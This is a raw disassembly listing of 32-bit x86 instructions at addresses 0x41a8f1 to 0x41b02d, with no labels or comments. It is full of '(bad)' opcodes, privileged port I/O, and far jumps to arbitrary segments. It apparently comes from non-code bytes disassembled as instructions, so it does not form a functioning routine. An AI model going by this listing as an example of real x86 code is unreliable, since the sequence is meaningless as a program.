  41a8f1:	cmp    eax,0xfd7ed61c
  41a8f6:	adc    edx,esp
  41a8f8:	int    0x42
  41a8fa:	fild   WORD PTR [eax]
  41a8fc:	xlat   BYTE PTR ds:[ebx]
  41a8fd:	xchg   ebp,eax
  41a8fe:	shr    BYTE PTR [eax-0x1],cl
  41a901:	push   edx
  41a902:	pop    ds
  41a903:	cli    
  41a904:	gs cmp edx,edx
  41a907:	sti    
  41a908:	(bad)  
  41a909:	int3   
  41a90a:	ins    DWORD PTR es:[edi],dx
  41a90b:	and    DWORD PTR [edi+0x39],ebp
  41a90e:	mov    ebp,0x9d6a15
  41a913:	(bad)  
  41a914:	cmp    bl,BYTE PTR [esi+ebx*1+0x51]
  41a918:	sahf   
  41a919:	es idiv ecx
  41a91c:	sub    edi,DWORD PTR [edx+0x1af72373]
  41a922:	ror    BYTE PTR [esi+0x2e046a79],0xbb
  41a929:	add    al,0xd6
  41a92b:	int3   
  41a92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a92d:	mov    esi,0x502d7236
  41a932:	div    BYTE PTR [eax-0x2]
  41a935:	sbb    DWORD PTR [ebx],edi
  41a937:	lods   eax,DWORD PTR ds:[esi]
  41a938:	lahf   
  41a939:	pop    esp
  41a93a:	sbb    eax,0xfefcd731
  41a93f:	and    edx,ebx
  41a941:	repnz push ss
  41a943:	jno    0x41a905
  41a945:	not    BYTE PTR [esp+edx*8-0x586e1d15]
  41a94c:	mov    ebp,0x1eb09a12
  41a951:	lods   al,BYTE PTR ds:[esi]
  41a952:	jmp    0x2215c95e
  41a957:	fadd   QWORD PTR ds:0x4d3ac85d
  41a95d:	cmp    ecx,0xffffff82
  41a960:	jmp    0xdbf9:0x41a98144
  41a967:	lods   al,BYTE PTR ds:[esi]
  41a968:	or     DWORD PTR [eax],esp
  41a96a:	mov    edx,0x34f601d0
  41a96f:	repz add esp,esi
  41a972:	sbb    al,0x9c
  41a974:	out    0x64,eax
  41a976:	gs (bad) 
  41a978:	jo     0x41a90a
  41a97a:	and    eax,edx
  41a97c:	cmp    al,0xb3
  41a97e:	push   ds
  41a97f:	xor    ah,dl
  41a981:	jno    0x41aa01
  41a983:	cmp    BYTE PTR es:[ebp+0x7ff4fcb7],dh
  41a98a:	dec    ebp
  41a98b:	mov    edi,0x49ecb22
  41a990:	(bad)  
  41a991:	in     eax,0xad
  41a993:	and    dh,bl
  41a995:	or     ecx,DWORD PTR [esp+ebp*8+0x48]
  41a999:	test   al,0xd5
  41a99b:	inc    edi
  41a99c:	sub    DWORD PTR [edi],ebx
  41a99e:	cmp    DWORD PTR ds:0x2fedebf3,esi
  41a9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9a5:	fimul  DWORD PTR [edi+edi*4-0x3973b4da]
  41a9ac:	mov    ds:0xb8c66350,al
  41a9b1:	je     0x41aa07
  41a9b3:	pop    ds
  41a9b4:	stos   DWORD PTR es:[edi],eax
  41a9b5:	dec    ebp
  41a9b6:	jge    0x41a985
  41a9b8:	stos   BYTE PTR es:[edi],al
  41a9b9:	jle    0x41a992
  41a9bb:	ins    DWORD PTR es:[edi],dx
  41a9bc:	cmp    ah,dh
  41a9be:	aaa    
  41a9bf:	add    edx,ebp
  41a9c1:	dec    edi
  41a9c2:	pop    edi
  41a9c3:	mov    cl,0xa7
  41a9c5:	ins    BYTE PTR es:[edi],dx
  41a9c6:	out    dx,eax
  41a9c7:	pop    ss
  41a9c8:	call   DWORD PTR [ebp+0x39]
  41a9cb:	sub    BYTE PTR [ebp-0x7a5e0551],0xb7
  41a9d2:	push   edx
  41a9d3:	push   0xfffffffa
  41a9d5:	pusha  
  41a9d6:	out    0xfe,al
  41a9d8:	popf   
  41a9d9:	shl    BYTE PTR [ebx],cl
  41a9db:	xor    cl,bl
  41a9dd:	mov    BYTE PTR es:[esi+0x2bea3343],cl
  41a9e4:	push   esp
  41a9e5:	xor    esi,DWORD PTR [edi+0x22c9a07c]
  41a9eb:	add    ecx,DWORD PTR [ebx]
  41a9ed:	sub    eax,0xb6f4a395
  41a9f2:	sbb    ah,BYTE PTR [eax+eax*8]
  41a9f5:	jg     0x41a9a8
  41a9f7:	dec    esp
  41a9f8:	fwait
  41a9f9:	jae    0x41aa68
  41a9fb:	pusha  
  41a9fc:	aad    0xb7
  41a9fe:	popf   
  41a9ff:	cli    
  41aa00:	ror    esi,1
  41aa02:	gs out 0x16,eax
  41aa05:	pop    ebx
  41aa06:	mov    BYTE PTR [edx+0x2723c18f],0xb5
  41aa0d:	jmp    FWORD PTR [edi-0x73f47f9d]
  41aa13:	jg     0x41aa3e
  41aa15:	mov    eax,0xc9f68b15
  41aa1a:	jno    0x41a9b0
  41aa1c:	std    
  41aa1d:	mov    bl,0xf
  41aa1f:	push   ss
  41aa20:	sub    cl,bl
  41aa22:	and    dh,BYTE PTR [ebx]
  41aa24:	popa   
  41aa25:	mov    esi,0xce8fec83
  41aa2a:	push   eax
  41aa2b:	je     0x41aa7f
  41aa2d:	stos   DWORD PTR es:[edi],eax
  41aa2e:	dec    ecx
  41aa2f:	ja     0x41aa44
  41aa31:	shr    BYTE PTR [ebx],0xbc
  41aa34:	std    
  41aa35:	les    esp,FWORD PTR [edi+ebx*4]
  41aa38:	dec    edi
  41aa39:	lock fucom st(1)
  41aa3c:	into   
  41aa3d:	xchg   DWORD PTR [ecx+0x18],ebp
  41aa40:	push   ebx
  41aa41:	lods   al,BYTE PTR ds:[esi]
  41aa42:	jg     0x41aaa1
  41aa44:	sub    cl,bh
  41aa46:	ret    
  41aa47:	dec    eax
  41aa48:	cwde   
  41aa49:	cmp    eax,0x3d05835a
  41aa4e:	sbb    eax,0x2b1725ca
  41aa53:	pop    es
  41aa54:	mov    ecx,0xfc0d02e5
  41aa59:	xor    ch,BYTE PTR ds:0x4df52871
  41aa5f:	mov    ah,BYTE PTR [ecx+0x5239875b]
  41aa65:	(bad)
  41aa69:	mov    ebx,0xdf194152
  41aa6e:	xchg   ebx,eax
  41aa6f:	mov    al,ds:0x1a412a9
  41aa74:	push   es
  41aa75:	cdq    
  41aa76:	int    0x2
  41aa78:	aam    0x51
  41aa7a:	loopne 0x41aac9
  41aa7c:	sbb    dl,BYTE PTR [edi-0x6ee7f1e4]
  41aa82:	sub    al,0x79
  41aa84:	fdivr  QWORD PTR [edi-0x62]
  41aa87:	mov    dh,0xf6
  41aa89:	rcl    BYTE PTR [ebp-0x3d],1
  41aa8c:	adc    cl,dl
  41aa8e:	push   eax
  41aa8f:	sahf   
  41aa90:	sbb    dl,dl
  41aa92:	cmc    
  41aa93:	popa   
  41aa94:	mov    ebp,0x3247066a
  41aa99:	pushf  
  41aa9a:	lahf   
  41aa9b:	mov    BYTE PTR [esi+0x28],ch
  41aa9e:	jle    0x41aa79
  41aaa0:	jle    0x41aa62
  41aaa2:	adc    BYTE PTR [ecx+0x59078a8f],0xa3
  41aaa9:	xchg   edx,eax
  41aaaa:	outs   dx,BYTE PTR ds:[esi]
  41aaab:	popf   
  41aaac:	add    BYTE PTR [edi+ebx*4+0x5f6492eb],bl
  41aab3:	mov    cl,0x5e
  41aab5:	in     eax,0x44
  41aab7:	into   
  41aab8:	sub    ch,BYTE PTR [eax]
  41aaba:	jo     0x41aac5
  41aabc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aabd:	fwait
  41aabe:	pop    es
  41aabf:	mov    ds:0xfd43c63a,al
  41aac4:	push   ecx
  41aac5:	xlat   BYTE PTR ds:[ebx]
  41aac6:	cmp    DWORD PTR [esi-0x31],ecx
  41aac9:	xchg   BYTE PTR ds:[ebp+0x1444c21e],al
  41aad0:	jnp    0x41aa62
  41aad2:	mov    eax,ds:0x739256ea
  41aad7:	dec    ebp
  41aad8:	add    al,0x5
  41aada:	push   ds
  41aadb:	push   esp
  41aadc:	dec    edx
  41aadd:	test   al,0x98
  41aadf:	push   es
  41aae0:	icebp  
  41aae1:	pop    ecx
  41aae2:	sti    
  41aae3:	sub    al,0xfd
  41aae5:	pextrw esp,(bad),0xc5
  41aae7:	daa    
  41aae8:	sti    
  41aae9:	sbb    bl,cl
  41aaeb:	(bad)  
  41aaec:	in     al,0x81
  41aaee:	add    al,0xaa
  41aaf0:	fwait
  41aaf1:	xchg   esp,eax
  41aaf2:	add    DWORD PTR [ecx-0x41],eax
  41aaf5:	xor    al,BYTE PTR [ecx+0x78]
  41aaf8:	push   0x608b975d
  41aafd:	adc    bl,BYTE PTR [ebp+0x164a3d75]
  41ab03:	call   0xa36faf1
  41ab08:	dec    edx
  41ab09:	pop    ebp
  41ab0a:	or     dl,BYTE PTR [eax-0x7]
  41ab0d:	add    BYTE PTR [eax+0xc],dl
  41ab10:	lea    esp,[esp+ebp*2]
  41ab13:	nop
  41ab14:	(bad)
  41ab17:	mov    ebp,0x5bc5db72
  41ab1c:	into   
  41ab1d:	pmaddwd mm1,QWORD PTR [ecx+0x34f540e0]
  41ab24:	sub    BYTE PTR [ecx],ch
  41ab26:	add    al,0xd6
  41ab28:	paddw  mm1,QWORD PTR ds:0x6ddabe5f
  41ab2f:	cli    
  41ab30:	sbb    DWORD PTR [edx-0x74],eax
  41ab33:	imul   esi,DWORD PTR [eax+0x77],0x5f
  41ab37:	xchg   edx,eax
  41ab38:	pop    DWORD PTR [ebp+0x110a4576]
  41ab3e:	sub    dl,al
  41ab40:	mov    dl,0x3e
  41ab42:	in     eax,0xb8
  41ab44:	mov    BYTE PTR [eax],dh
  41ab46:	gs gs push 0xb79a559
  41ab4d:	stc    
  41ab4e:	fsub   st,st(1)
  41ab50:	sti    
  41ab51:	(bad)  
  41ab52:	fidivr WORD PTR [edi-0x2d]
  41ab55:	repnz cmc 
  41ab57:	mov    bh,0x18
  41ab59:	inc    edi
  41ab5a:	fnsave [ebx-0x249a61fb]
  41ab60:	pop    esp
  41ab61:	or     cl,al
  41ab63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab64:	cmp    BYTE PTR [edx],dh
  41ab66:	test   eax,0xea610631
  41ab6b:	cli    
  41ab6c:	lods   eax,DWORD PTR ds:[esi]
  41ab6d:	mov    cl,0xd8
  41ab6f:	mov    bl,0x8c
  41ab71:	sbb    al,0x93
  41ab73:	push   edx
  41ab74:	not    DWORD PTR [esi-0xbfbdcf3]
  41ab7a:	ds test eax,0xef7c6842
  41ab80:	hlt    
  41ab81:	ins    DWORD PTR es:[edi],dx
  41ab82:	push   0x54
  41ab84:	gs stos BYTE PTR es:[edi],al
  41ab86:	pop    esp
  41ab87:	mov    edi,0x65cc4de1
  41ab8c:	jg     0x41abaf
  41ab8e:	out    0xc9,al
  41ab90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab91:	mov    ch,BYTE PTR [edx+esi*1]
  41ab94:	and    DWORD PTR [ecx],0x70629014
  41ab9a:	or     edx,esp
  41ab9c:	nop
  41ab9d:	cs adc ah,al
  41aba0:	mov    edx,0xdee0b84d
  41aba5:	cld    
  41aba6:	scas   al,BYTE PTR es:[edi]
  41aba7:	das    
  41aba8:	xchg   esp,eax
  41aba9:	shr    DWORD PTR [esi-0x49],0xe7
  41abad:	arpl   WORD PTR [esi-0x48259e7a],ax
  41abb3:	(bad)  
  41abb4:	in     al,dx
  41abb5:	jne    0x41abb3
  41abb7:	fwait
  41abb8:	loop   0x41abc1
  41abba:	int    0xc1
  41abbc:	ror    BYTE PTR [ebp+0x1d11f56d],cl
  41abc2:	xchg   edx,eax
  41abc3:	dec    eax
  41abc4:	jge    0x41ac1c
  41abc6:	fs into 
  41abc8:	mov    dh,0x27
  41abca:	or     BYTE PTR [edi+0x6e67b4c9],dh
  41abd0:	and    esi,DWORD PTR [ebx]
  41abd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abd3:	ret    
  41abd4:	push   ds
  41abd5:	pop    es
  41abd6:	jp     0x41aba1
  41abd8:	adc    ebx,DWORD PTR [ebx+ecx*2]
  41abdb:	add    DWORD PTR [eax+0x18641953],ebp
  41abe1:	jge    0x41abff
  41abe3:	dec    eax
  41abe4:	fcomp  DWORD PTR [eax]
  41abe6:	shl    DWORD PTR [edx-0x124ef4e1],0xd
  41abed:	call   0x580790cd
  41abf2:	loopne 0x41ac25
  41abf4:	std    
  41abf5:	pushf  
  41abf6:	sub    eax,ecx
  41abf8:	dec    edx
  41abf9:	pushf  
  41abfa:	daa    
  41abfb:	retf   
  41abfc:	(bad)  
  41abfd:	mov    eax,0x6129a808
  41ac02:	add    bh,BYTE PTR [ecx-0x1e]
  41ac05:	fisttp WORD PTR [eax-0xc7f0049]
  41ac0b:	push   esi
  41ac0c:	sub    eax,0x64fb6ce3
  41ac11:	mov    cl,0x4f
  41ac13:	fistp  QWORD PTR [edx+0x10]
  41ac16:	retf   
  41ac17:	mov    ch,0x4b
  41ac19:	or     BYTE PTR fs:[ebx+0x14175ecf],cl
  41ac20:	pop    es
  41ac21:	addr16 jg 0x41ac41
  41ac24:	shl    ecx,cl
  41ac26:	gs inc esp
  41ac28:	hlt    
  41ac29:	int3   
  41ac2a:	push   eax
  41ac2b:	mov    esi,0x45bac5b7
  41ac30:	mov    fs,edx
  41ac32:	inc    ebp
  41ac33:	xchg   edi,eax
  41ac34:	pop    eax
  41ac35:	xlat   BYTE PTR ds:[ebx]
  41ac36:	jecxz  0x41ac87
  41ac38:	into   
  41ac39:	sub    ecx,DWORD PTR [eax]
  41ac3b:	jno    0x41abe0
  41ac3d:	add    al,0x1
  41ac3f:	inc    eax
  41ac40:	std    
  41ac41:	rcr    BYTE PTR [eax+0x10],1
  41ac44:	int3   
  41ac45:	lock mov dl,0xab
  41ac48:	jmp    0x37a0:0xa5b6bb3b
  41ac4f:	je     0x41abd2
  41ac51:	jb     0x41acc2
  41ac53:	repz push ecx
  41ac55:	arpl   WORD PTR [ebp-0x7073ba8e],cx
  41ac5b:	xor    BYTE PTR [eax-0x3101424a],0x92
  41ac62:	pop    ss
  41ac63:	int3   
  41ac64:	mov    edx,ebp
  41ac66:	in     eax,0x81
  41ac68:	pop    ds
  41ac69:	mov    ds:0xe76c43f2,al
  41ac6e:	test   eax,0x96e90aa8
  41ac73:	and    DWORD PTR [esi],ebp
  41ac75:	jle    0x41ac9d
  41ac77:	xchg   DWORD PTR [edx+esi*8],eax
  41ac7a:	jno    0x41acc5
  41ac7c:	lock dec eax
  41ac7e:	sub    BYTE PTR [esi],0xce
  41ac81:	pop    ebp
  41ac82:	test   BYTE PTR [ebx-0x7],bl
  41ac85:	ret    0xa53c
  41ac88:	ins    BYTE PTR es:[edi],dx
  41ac89:	sahf   
  41ac8a:	or     ch,dl
  41ac8c:	add    BYTE PTR [eax-0x447fa99f],cl
  41ac92:	inc    esp
  41ac93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac94:	pcmpgtd mm0,QWORD PTR [ecx-0x1e]
  41ac98:	hlt    
  41ac99:	loop   0x41ac62
  41ac9b:	pop    ss
  41ac9c:	fdivr  DWORD PTR [ebx+0x13774902]
  41aca2:	data16 jo 0x41ac30
  41aca5:	mov    esp,0xf8ace47f
  41acaa:	popa   
  41acab:	mov    bh,0x29
  41acad:	bound  ebp,QWORD PTR [ecx+0x46f3d851]
  41acb3:	dec    edx
  41acb5:	cmc    
  41acb6:	push   cs
  41acb7:	loopne 0x41ac4b
  41acb9:	jge    0x41ac3d
  41acbb:	int    0xb6
  41acbd:	xchg   esp,eax
  41acbe:	aaa    
  41acbf:	xchg   DWORD PTR [edx-0x70231de9],ecx
  41acc5:	and    eax,edi
  41acc7:	push   esi
  41acc8:	imul   edi,ebp,0xfffffff6
  41accb:	mov    ah,0x7a
  41accd:	cmp    BYTE PTR [edx],al
  41accf:	sub    edx,ebx
  41acd1:	jg     0x41accb
  41acd3:	mov    cl,0x37
  41acd5:	push   ebx
  41acd6:	les    ebx,FWORD PTR [esp+eiz*4-0x7e]
  41acda:	mov    edi,0x309e3843
  41acdf:	(bad)  
  41ace0:	int3   
  41ace1:	ret    
  41ace2:	loope  0x41ad3a
  41ace4:	add    bh,bh
  41ace6:	lahf   
  41ace7:	push   esp
  41ace8:	cmp    DWORD PTR [ebx-0x4c20f48f],ebp
  41acee:	sbb    esp,DWORD PTR [ebp+0x6c4c789e]
  41acf4:	pushf  
  41acf5:	nop
  41acf6:	dec    eax
  41acf7:	data16 hlt 
  41acf9:	pop    ss
  41acfa:	addr16 je 0x41acfd
  41acfd:	cmp    BYTE PTR [ebp+0x76],dl
  41ad00:	test   BYTE PTR ds:0xa55bb664,dl
  41ad06:	cmp    eax,DWORD PTR [edi-0x9]
  41ad09:	mov    al,BYTE PTR [esi-0x9]
  41ad0c:	sub    eax,0xb15dc309
  41ad11:	adc    DWORD PTR [edi-0x55],ebp
  41ad14:	pop    ebx
  41ad15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad16:	mov    dl,0x2
  41ad18:	fsubr  DWORD PTR [edi+0x7a]
  41ad1b:	mov    dl,0x70
  41ad1d:	cmp    ecx,ebp
  41ad1f:	(bad)  
  41ad20:	cli    
  41ad21:	push   ebx
  41ad22:	xlat   BYTE PTR ds:[ebx]
  41ad23:	lea    ebx,[edi+0x6f999ce9]
  41ad29:	out    dx,eax
  41ad2a:	lds    eax,FWORD PTR [ebp+0x7872d610]
  41ad30:	dec    ecx
  41ad31:	lods   al,BYTE PTR ds:[esi]
  41ad32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad33:	(bad)  
  41ad34:	pop    ecx
  41ad35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad36:	loope  0x41ad53
  41ad38:	dec    ecx
  41ad39:	dec    edx
  41ad3a:	cmp    ah,BYTE PTR [ebx]
  41ad3c:	mov    ds:0xe973e807,eax
  41ad41:	aas    
  41ad42:	add    eax,0xe99d194b
  41ad47:	inc    edx
  41ad48:	mov    cl,0x2f
  41ad4a:	ds mov dl,0x5f
  41ad4d:	xchg   ecx,eax
  41ad4e:	add    edx,esp
  41ad50:	sbb    al,0xb9
  41ad52:	jnp    0x41ad4f
  41ad54:	fucomi st,st(0)
  41ad56:	jae    0x41ad0a
  41ad58:	push   es
  41ad59:	call   0x7637:0x62b0a646
  41ad60:	add    ecx,DWORD PTR [esi+0x2f]
  41ad63:	mov    edx,0xee3406ed
  41ad68:	(bad)  
  41ad69:	push   ebx
  41ad6a:	arpl   WORD PTR [eax],bp
  41ad6c:	and    BYTE PTR [eax+0x32cafa3b],cl
  41ad72:	pop    edi
  41ad73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad74:	push   es
  41ad75:	pop    ebp
  41ad76:	in     al,0xcb
  41ad78:	and    ecx,esp
  41ad7a:	mov    eax,0x4c3683bb
  41ad7f:	stos   BYTE PTR es:[edi],al
  41ad80:	int    0x4f
  41ad82:	jns    0x41adad
  41ad84:	xlat   BYTE PTR ds:[ebx]
  41ad85:	arpl   si,ax
  41ad87:	inc    esp
  41ad88:	fstp   QWORD PTR [ecx]
  41ad8a:	mov    eax,0xf7b9da5
  41ad8f:	xchg   ebp,eax
  41ad90:	inc    ebx
  41ad91:	gs sbb dl,dl
  41ad94:	ret    
  41ad95:	jp     0x41ad39
  41ad97:	stc    
  41ad98:	fild   WORD PTR [ecx]
  41ad9a:	xchg   esi,eax
  41ad9b:	dec    DWORD PTR [esi]
  41ad9d:	not    ebp
  41ad9f:	xchg   edx,eax
  41ada0:	pop    esp
  41ada1:	out    0xed,al
  41ada3:	add    DWORD PTR [ebx+esi*8-0x7],edx
  41ada7:	adc    BYTE PTR [esi-0x128bb4b1],0x8a
  41adae:	and    DWORD PTR [edx-0x5e208b69],esp
  41adb4:	retf   0xdc8f
  41adb7:	ds daa 
  41adb9:	rcl    DWORD PTR [ebx-0x4ef377b7],cl
  41adbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adc0:	(bad)  
  41adc1:	fnstenv [ebx]
  41adc3:	sbb    DWORD PTR [ecx+0x5e967a3c],ebp
  41adc9:	int    0x58
  41adcb:	xchg   ebx,eax
  41adcc:	pop    eax
  41adcd:	popf   
  41adce:	sbb    ecx,DWORD PTR ss:[edi-0x63b8394c]
  41add5:	aad    0x65
  41add7:	mov    ebx,0xb60d0fda
  41addc:	mov    cl,BYTE PTR ds:0xc44846ad
  41ade2:	push   ebp
  41ade3:	xchg   al,bl
  41ade5:	xchg   DWORD PTR [eax-0x15a0c833],esi
  41adeb:	and    cl,bl
  41aded:	rcl    DWORD PTR [eax+0x73c4b4d6],0x37
  41adf4:	xchg   edx,eax
  41adf5:	adc    edx,esp
  41adf7:	(bad)  
  41adf8:	enter  0xf1e7,0x8c
  41adfc:	mov    DWORD PTR [ebx],ecx
  41adfe:	ins    DWORD PTR es:[edi],dx
  41adff:	jmp    0x76768cfe
  41ae04:	add    DWORD PTR [eax],eax
  41ae06:	xor    bl,BYTE PTR [ebx+0x22]
  41ae09:	add    al,0x3c
  41ae0b:	adc    eax,0x229e7f82
  41ae10:	or     ch,BYTE PTR [ebx+0x6e]
  41ae13:	ror    esp,0xb8
  41ae16:	adc    eax,0x5413e5e6
  41ae1b:	popf   
  41ae1c:	pop    ebx
  41ae1d:	cmp    al,0x3f
  41ae1f:	test   al,0x33
  41ae21:	and    BYTE PTR [edx+0x3c],bh
  41ae24:	ror    BYTE PTR [esi+0x309ff142],1
  41ae2a:	push   ecx
  41ae2b:	lods   eax,DWORD PTR ds:[esi]
  41ae2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae2d:	pop    eax
  41ae2e:	xor    DWORD PTR [ebx-0x7],0x15
  41ae32:	aam    0x82
  41ae34:	adc    DWORD PTR [esi],0xe527e927
  41ae3a:	scas   al,BYTE PTR es:[edi]
  41ae3b:	push   edx
  41ae3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae3d:	jecxz  0x41adc5
  41ae3f:	js     0x41ae4b
  41ae41:	or     DWORD PTR [ebp-0x913704e],0xd065bcdd
  41ae4b:	cld    
  41ae4c:	in     eax,dx
  41ae4d:	pop    ebp
  41ae4e:	repz les ebx,FWORD PTR gs:[ecx]
  41ae52:	jbe    0x41aecd
  41ae54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae55:	jecxz  0x41ae43
  41ae57:	or     ebp,edi
  41ae59:	jo     0x41ae2a
  41ae5b:	inc    eax
  41ae5c:	pop    ds
  41ae5d:	pop    ecx
  41ae5e:	mov    bh,BYTE PTR ds:0x2f10509c
  41ae64:	mov    eax,0x6b960176
  41ae69:	add    al,0xe8
  41ae6b:	das    
  41ae6c:	shl    BYTE PTR [esi+0xe],cl
  41ae6f:	mov    ds:0x6f14d53d,al
  41ae74:	pop    ebp
  41ae75:	dec    ebx
  41ae76:	xor    ebp,DWORD PTR [esi+0x25427d99]
  41ae7c:	cmp    esi,esi
  41ae7e:	push   esi
  41ae7f:	stos   BYTE PTR es:[edi],al
  41ae80:	jmp    0x1a25:0x6a6eeac6
  41ae87:	inc    edx
  41ae88:	dec    ebp
  41ae89:	retf   
  41ae8a:	xor    eax,0x19a0ff28
  41ae8f:	jmp    0xac46:0x5f57b3a2
  41ae96:	out    dx,eax
  41ae97:	push   ebp
  41ae98:	dec    BYTE PTR ds:0xbaa5c9e9
  41ae9e:	in     al,dx
  41ae9f:	adc    bh,bl
  41aea1:	mov    cl,0x75
  41aea3:	fimul  DWORD PTR [edi+0x606d5792]
  41aea9:	inc    esp
  41aeaa:	sub    DWORD PTR [edx],0x28b4180a
  41aeb0:	dec    ecx
  41aeb1:	std    
  41aeb2:	dec    ebx
  41aeb3:	mov    BYTE PTR [ecx],al
  41aeb5:	mov    DWORD PTR [esi+ebp*4+0x25c5d4f4],ebx
  41aebc:	sbb    DWORD PTR [ebx],eax
  41aebe:	or     esp,edi
  41aec0:	sbb    dh,ch
  41aec2:	popf   
  41aec3:	cmp    BYTE PTR [eax-0x38],0xeb
  41aec7:	(bad)  
  41aec8:	push   ebp
  41aec9:	xchg   edx,eax
  41aeca:	stos   BYTE PTR es:[edi],al
  41aecb:	add    eax,0x67ffb096
  41aed0:	outs   dx,BYTE PTR ds:[esi]
  41aed1:	(bad)  
  41aed2:	cmp    edx,DWORD PTR [ebp+0x393f24ec]
  41aed8:	or     al,0xae
  41aeda:	xchg   ebx,eax
  41aedb:	cmp    ecx,DWORD PTR ds:0xdc0acf58
  41aee1:	ficom  DWORD PTR [eax]
  41aee3:	loopne 0x41ae7d
  41aee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee6:	aas    
  41aee7:	rcl    BYTE PTR [ebp+ecx*8-0x47e185c3],cl
  41aeee:	pushf  
  41aeef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aef0:	xchg   edx,eax
  41aef1:	imul   ebp,ebp,0x75
  41aef4:	xor    DWORD PTR [ecx+0x57],edi
  41aef7:	test   eax,0x27505a66
  41aefc:	mov    BYTE PTR [esi],bl
  41aefe:	sub    eax,0x71d61d68
  41af03:	int3   
  41af04:	dec    esp
  41af05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af06:	xor    BYTE PTR [ecx-0xa4513ee],bh
  41af0c:	ins    DWORD PTR es:[edi],dx
  41af0d:	dec    ecx
  41af0e:	xchg   DWORD PTR [esi+0x22c87510],edi
  41af14:	dec    esp
  41af15:	or     BYTE PTR [esi+0x11ad83e6],cl
  41af1b:	ret    0x2386
  41af1e:	in     eax,0xbe
  41af20:	fisub  DWORD PTR [edx-0xeff596c]
  41af26:	in     eax,0x46
  41af28:	xchg   esi,eax
  41af29:	adc    esp,0x3a
  41af2c:	(bad)  
  41af2d:	idiv   BYTE PTR [edi]
  41af2f:	dec    eax
  41af30:	pushf  
  41af31:	xchg   dh,ah
  41af33:	push   esp
  41af34:	and    edi,0x7e
  41af37:	adc    DWORD PTR [esi-0x7834e2b5],0xa73e9b07
  41af41:	cmp    DWORD PTR [ebx+0x21],eax
  41af44:	mov    eax,ds:0x90b66db
  41af49:	pop    ss
  41af4a:	xor    ch,BYTE PTR [ecx]
  41af4c:	xchg   edx,eax
  41af4d:	mov    bh,0xbb
  41af4f:	push   edx
  41af50:	push   edx
  41af51:	mov    ds:0xf237205e,eax
  41af56:	loopne 0x41aef1
  41af58:	js     0x41af15
  41af5a:	out    dx,al
  41af5b:	lahf   
  41af5c:	and    al,0x4e
  41af5e:	mov    eax,0x43ef7da2
  41af63:	cwde   
  41af64:	push   ss
  41af65:	cs add eax,0x4b13d0b5
  41af6b:	adc    DWORD PTR [eax+0x2e],eax
  41af6e:	jmp    0x9cfd:0x34e51179
  41af75:	(bad)  
  41af78:	inc    ebp
  41af79:	and    BYTE PTR gs:[ebx+0x77],dh
  41af7d:	inc    esp
  41af7e:	fidiv  DWORD PTR [edi-0x1b]
  41af81:	dec    esp
  41af82:	mov    bl,BYTE PTR [edx+0x3a04b5dc]
  41af88:	xor    ch,BYTE PTR [ebx+0x36]
  41af8b:	dec    DWORD PTR [esi]
  41af8d:	in     eax,dx
  41af8e:	sbb    DWORD PTR [esi-0x2],esp
  41af91:	nop
  41af92:	test   al,0x7a
  41af94:	cmc    
  41af95:	push   0xffffffae
  41af97:	dec    esi
  41af98:	add    DWORD PTR [ebp-0x6f],ebx
  41af9b:	sti    
  41af9c:	div    DWORD PTR [esi]
  41af9e:	arpl   WORD PTR [ecx-0x7e],cx
  41afa1:	mov    ?,WORD PTR ds:0xa80a8d75
  41afa7:	cmp    eax,0x253d974d
  41afac:	mov    ds:0x8c708db0,eax
  41afb1:	dec    ebx
  41afb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afb3:	out    0xe9,eax
  41afb5:	push   ds
  41afb6:	ja     0x41af4f
  41afb8:	cwde   
  41afb9:	add    cl,dl
  41afbb:	in     eax,0x50
  41afbd:	cmp    BYTE PTR [eax+ecx*4-0x19],ch
  41afc1:	jge    0x41af88
  41afc3:	mov    ecx,0x35e5a9db
  41afc8:	push   ss
  41afc9:	sbb    DWORD PTR [eax],0x1c
  41afcc:	and    al,0xfa
  41afce:	cmp    cl,BYTE PTR [edx+edx*2]
  41afd1:	sub    esi,edx
  41afd3:	mov    dh,0xdb
  41afd5:	pop    eax
  41afd6:	push   ebp
  41afd7:	jb     0x41af68
  41afd9:	les    bx,DWORD PTR [edi]
  41afdc:	cdq    
  41afdd:	iret   
  41afde:	loope  0x41af9c
  41afe0:	fdivr  DWORD PTR [ecx]
  41afe2:	mov    eax,ds:0xec3c8b77
  41afe7:	imul   ebx,DWORD PTR [esi-0x69],0x4f
  41afeb:	repz inc eax
  41afed:	dec    edx
  41afee:	fdivr  QWORD PTR [ebp-0x11]
  41aff1:	iret   
  41aff2:	xlat   BYTE PTR ds:[ebx]
  41aff3:	shl    DWORD PTR [esi-0x27],cl
  41aff6:	and    bh,ah
  41aff8:	stc    
  41aff9:	inc    ebx
  41affa:	pushw  0x1a22
  41affe:	mov    dl,0x6
  41b000:	cwde   
  41b001:	xchg   esp,eax
  41b002:	pop    esi
  41b003:	or     BYTE PTR ds:0xa5266f4d,al
  41b009:	push   ebx
  41b00a:	inc    ebp
  41b00b:	xor    al,0x2b
  41b00d:	test   al,0x2d
  41b00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b010:	or     BYTE PTR [ecx-0x10],bh
  41b013:	jmp    0x6db6:0xad9ce68d
  41b01a:	jae    0x41b041
  41b01c:	imul   esp,DWORD PTR [esi+ecx*1+0x3b],0x12
  41b021:	shl    DWORD PTR cs:[ebp-0x5692c3fe],0xfa
  41b029:	fldenv es:[ecx-0x46]
  41b02d:	push   0xffffffe4
